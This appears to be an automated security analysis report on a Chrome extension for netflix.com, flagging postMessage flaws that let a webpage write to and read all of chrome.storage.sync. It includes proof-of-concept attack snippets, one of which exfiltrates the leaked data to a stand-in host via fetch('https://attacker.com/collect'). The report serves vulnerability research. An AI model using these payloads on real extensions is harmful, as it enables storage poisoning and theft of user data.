# CoCo Analysis: gaoiiiehelhpkmpkolndijhiogfholcc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gaoiiiehelhpkmpkolndijhiogfholcc/opgen_generated_files/cs_0.js
Line 491: `window.addEventListener("message", function (event) {`
Line 492: `if (event.data.jamakFlix && event.data.type) {`
Line 502: `chrome.storage.sync.set(event.data.setting, function (items) {`

**Code:**

```javascript
// Content script (cs_0.js Line 491-506)
window.addEventListener("message", function (event) { // ← entry point
    if (event.data.jamakFlix && event.data.type) {
        if (event.data.type === "get") {
            chrome.storage.sync.get(null, function (items) {
                window.postMessage({
                    type: "update",
                    settings: items,
                    jamakFlix: true
                }, "*");
            });
        } else if (event.data.type === "set") {
            chrome.storage.sync.set(event.data.setting, function (items) { // ← sink
                // ← attacker-controlled data from event.data.setting
            });
        }
    }
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// From any webpage where the content script is injected (netflix.com)
window.postMessage({
    jamakFlix: true,
    type: "set",
    setting: {
        malicious: "data",
        poisoned: true,
        evilConfig: "attacker-value"
    }
}, "*");
```

**Impact:** Storage poisoning - attacker can inject arbitrary data into chrome.storage.sync. The webpage (netflix.com) can send postMessage to poison the extension's storage with malicious configuration data, potentially altering subtitle settings or other extension behavior.

---

## Sink 2 & 3: storage_sync_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gaoiiiehelhpkmpkolndijhiogfholcc/opgen_generated_files/cs_0.js
Line 494-500: chrome.storage.sync.get() retrieves all storage and sends via window.postMessage

**Code:**

```javascript
// Content script (cs_0.js Line 491-506)
window.addEventListener("message", function (event) {
    if (event.data.jamakFlix && event.data.type) {
        if (event.data.type === "get") {
            chrome.storage.sync.get(null, function (items) { // ← retrieve all storage
                window.postMessage({ // ← sink: leak to webpage
                    type: "update",
                    settings: items, // ← all stored data leaked
                    jamakFlix: true
                }, "*");
            });
        }
        // ... set handler from Sink 1 ...
    }
}, false);

// Additional automatic leak on storage changes (cs_0.js Line 508-513)
chrome.storage.onChanged.addListener(function (changes) {
    window.postMessage({
        type: "get",
        jamakFlix: true
    }, "*"); // ← triggers the get handler above, leaking data
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event) - Complete Storage Exploitation Chain

**Attack:**

```javascript
// Step 1: Poison storage
window.postMessage({
    jamakFlix: true,
    type: "set",
    setting: { test: "poisoned" }
}, "*");

// Step 2: Retrieve all storage data (including poisoned and legitimate data)
window.addEventListener("message", function(event) {
    if (event.data.jamakFlix && event.data.type === "update") {
        console.log("Leaked storage data:", event.data.settings);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(event.data.settings)
        });
    }
});

window.postMessage({
    jamakFlix: true,
    type: "get"
}, "*");
```

**Impact:** Complete storage exploitation chain - information disclosure of ALL chrome.storage.sync data. An attacker controlling netflix.com (or via XSS on netflix.com) can:
1. Write arbitrary data to extension storage (Sink 1)
2. Read ALL stored extension settings and data (Sinks 2 & 3)
3. Exfiltrate legitimate user configuration and preferences
4. Manipulate extension behavior through corrupted settings

---

## Overall Vulnerability Assessment

This extension has THREE TRUE POSITIVE vulnerabilities forming a complete bidirectional attack:

1. **Storage Poisoning (Sink 1):** Webpage can inject arbitrary data into chrome.storage.sync via postMessage
2. **Information Disclosure (Sinks 2 & 3):** Webpage can retrieve ALL stored data via postMessage, including user preferences and configuration

The vulnerabilities are interconnected:
- The `window.addEventListener("message")` handler allows BOTH reading and writing storage
- The `chrome.storage.onChanged` listener automatically broadcasts storage updates back to the webpage
- The postMessage responses use wildcard origin ("*"), allowing any frame to receive the data

Attack requirements:
- Extension runs on netflix.com (per manifest)
- Attacker needs to control content on netflix.com (XSS) OR be netflix.com itself
- Extension has "storage" permission (confirmed in manifest)
- Fully exploitable - both read and write operations available

The extension creates a complete storage proxy that exposes privileged chrome.storage API to the unprivileged webpage context.
